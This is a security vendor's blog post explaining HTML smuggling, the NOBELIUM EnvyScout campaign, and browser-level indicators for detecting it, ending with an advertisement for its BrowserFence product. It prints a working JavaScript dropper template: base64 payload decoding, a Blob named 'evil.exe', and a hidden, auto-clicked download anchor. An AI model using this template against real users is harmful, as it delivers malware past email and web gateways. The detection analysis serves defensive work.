+++
title = 'HTML Smuggling Detection'
date = 2024-06-21T17:04:20+02:00
draft = false
image = '/posts/html-smuggling/static/html-smuggling.png'
+++

## Introduction

HTML smuggling is an advanced and stealthy tactic that leverages standard HTML5 and JavaScript features to avoid
detection and deliver Remote Access Trojans (RATs), banking malware, and other harmful software. This method is
increasingly being adopted by state-sponsored hacking groups and cybercriminals to infiltrate governments, individuals,
and businesses. One notable example is the NOBELIUM group, believed to have links to Russia, which has used HTML
smuggling to target government and diplomatic organizations worldwide. Microsoft researchers have observed that the
NOBELIUM group employed malicious HTML attachments in a campaign dubbed EnvyScout. These attachments act as droppers,
capable of de-obfuscating and writing malicious ISO files to the victim's system.

## How HTML Smuggling Works

This malware is essentially used to gain control of victim machines, effectively deliver payloads, and execute
ransomware attacks.

In HTML smuggling, the attacker uses a specially crafted HTML attachment that carries an encoded malicious script. When
the victim opens this malicious HTML file in their web browser, the browser decodes this embedded malicious script which
on execution further assembles the payload on the victim machine. The main advantage to threat actors is that instead of
passing the payload over the network, the malicious payload assembles on the victim’s machine. This makes the technique
highly evasive because it could bypass standard security controls like web proxies, firewalls, and email gateways. As
the payload is only created when the malicious HTML file is loaded on the victim’s machine through the web browser, the
security solutions only see HTML or JavaScript traffic which can be further obfuscated to evade detection.

<img src="/posts/html-smuggling/static/HTMLsmuggling-1.jpg" alt="where are the pieces" style="display: block; margin-left: auto; margin-right: auto; width: 100%; height: auto;">

## Code analysis

In this chapter we are going to analise a basic version of a html smuggling
payload. [see the full code](https://github.com/SofianeHamlaoui/Pentest-Notes/blob/master/offensive-security/defense-evasion/file-smuggling-with-html-and-javascript.md)

#### Base64 encoded data

```javascript
//convert function
function base64ToArrayBuffer(base64) {
    var binary_string = window.atob(base64);
    var len = binary_string.length;

    var bytes = new Uint8Array(len);
    for (var i = 0; i < len; i++) {
        bytes[i] = binary_string.charCodeAt(i);
    }
    return bytes.buffer;
}

//malware.exe encoded in Base64
var file = 'TVqQAAMAAAAEAAAA//8AALgAA[...]nBkYgA=';
var data = base64ToArrayBuffer(file);
```

As we observed, the malicious HTML file can deliver malware to the victim's machine through various methods. In this
scenario, the entire malware payload is encoded in base64 and embedded directly within the HTML file itself.
We can see the variable `file` containing the payload.

The function `base64ToArrayBuffer` converts the encoded payload into the actual bytes that make up the malicious file.

It is important to note that attackers can devise even more complex methods to deliver malware. For instance, they might
split the payload into several pieces, retrieve parts of it remotely, or use different encoding standards and encryption
techniques. These strategies significantly increase the likelihood of evading security measures such as web proxies,
firewalls, and email gateways.

#### JavaScript Blob

```javascript
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'evil.exe';
```

This is the core of the attack. The Blob object enables the creation of a file within the browser using JavaScript code.
Here is how Mozilla describes it:

```text
"The Blob interface represents a blob, which is a file-like object of immutable, raw data; they can be read as text or
binary data, or converted into a ReadableStream so its methods can be used for processing the data.
Blobs can represent data that isn't necessarily in a JavaScript-native format. The File interface is based on Blob,
inheriting blob functionality and expanding it to support files on the user's system."
```

<img src="/posts/html-smuggling/static/blob-struct.png" alt="where are the pieces" style="display: block; margin-left: auto; margin-right: auto; width: 100%; height: auto;">
<br>
Therefore, instead of relying on the web server to deliver a file, a Blob can be created locally using JavaScript. For
instance, an "evil.exe" file that would typically be downloaded from a server can instead be assembled and
downloaded directly on the target system using an HTML anchor tag with the download attribute.

#### HTML anchor download

```javascript 
if (window.navigator.msSaveOrOpenBlob) {
    window.navigator.msSaveOrOpenBlob(blob, fileName);
} else {
    var a = document.createElement('a');
    console.log(a);
    document.body.appendChild(a);
    a.style = 'display: none';
    var url = window.URL.createObjectURL(blob);
    a.href = url;
    a.download = fileName;
    a.click();
    window.URL.revokeObjectURL(url);
}
```

This code snippet checks if the browser supports `msSaveOrOpenBlob`. If supported (for older versions of Internet
Explorer
and Microsoft Edge), it uses it to save or open a Blob object (blob) with a specified file name (fileName). If not
supported, it creates a hidden <a> element in the document, sets up a Blob URL (url) for the Blob object (blob), assigns
the URL to the <a> element's href attribute, sets the download attribute to specify the file name (fileName), simulates
a click on the <a> element to trigger the download, and cleans up by revoking the Blob URL (url).

At this point the malicious file is stored on the victim's machine.

### Behaviour on browser

Now it is easy to imagine the numerous ways an attacker can devise to pull a malicious file and reconstruct it directly
on the victim's machine. We can view this stage as a high-level operation where the attacker manipulates encoding,
strings, and various remote and embedded resources. However, at a certain point, they must utilize specific browser
APIs (low-level operation)
to execute the attack. This is where we can intervene and take action!

#### Browser level IOCs

Every technique leaves traces, and in this case, our Indicators of Compromise (IOCs) are provided by the event of Blob
creation.
This event has several parameters and options, the most interesting of which are the ArrayBuffer, containing the
malware, and the type, which must be set to octet/stream.

<img src="/posts/html-smuggling/static/blob-event.png" alt="where are the pieces" style="display: block; margin-left: auto; margin-right: auto; width: 70%; height: auto;">
<br>
<img src="/posts/html-smuggling/static/buffer-array.png" alt="where are the pieces" style="display: block; margin-left: auto; margin-right: auto; width: 90%; height: auto;">
<br>
At this stage, the malicious file can no longer be obfuscated, split, or altered in any other way. It must be fully
loaded into memory, ready to be downloaded. Therefore, it is possible to monitor memory allocation and identify this
type of malicious file.

After this, an anchor element is created that points to a Blob URL with a download parameter and probably with
a `display:none` style, followed by a programmatic click on it. This
sequence of actions represents another specific behavior that can be identified and monitored for malicious activity.

```html
<a href="blob:null/5f2c2f2a-0349-43d2-a6ec-276bd4efb082" download="evil.exe" style="display: none;"></a>
```

## Conclusion

In conclusion, HTML smuggling represents a sophisticated method utilized by cyber adversaries to circumvent traditional
security measures and deliver malicious payloads directly to unsuspecting users. By embedding encoded scripts within
innocuous-looking HTML files, attackers can evade detection and execute harmful actions on victim machines. This
technique poses significant risks to individuals, businesses, and governments worldwide.

At TeamFence, we have conducted extensive analysis of HTML smuggling techniques and understand the critical importance
of proactive defense measures. Our solution is designed to detect and mitigate these stealthy attacks effectively. By
leveraging advanced detection algorithms and real-time monitoring capabilities, BrowserFence identifies suspicious
behaviors associated with HTML smuggling, such as the creation and manipulation of Blob URLs and the assembly of
malicious payloads in memory.

Protect your organization today with BrowserFence and stay ahead in the ever-evolving landscape of cybersecurity threats.
Contact us to learn more about how BrowserFence can defend your digital assets against HTML smuggling and ensure a secure
computing environment for your business.

<ul class="pt-4 d-flex gaps g-3 justify-content-center  animated" data-animate="fadeInUp" data-delay=".9">
    <li>
        <a href="#" class="btn btn-md btn-grad" data-overlay="bg-theme-grad-alternet"
           style="position: relative; top: 50px;">Install BrowserFence</a>
    </li>
</ul>
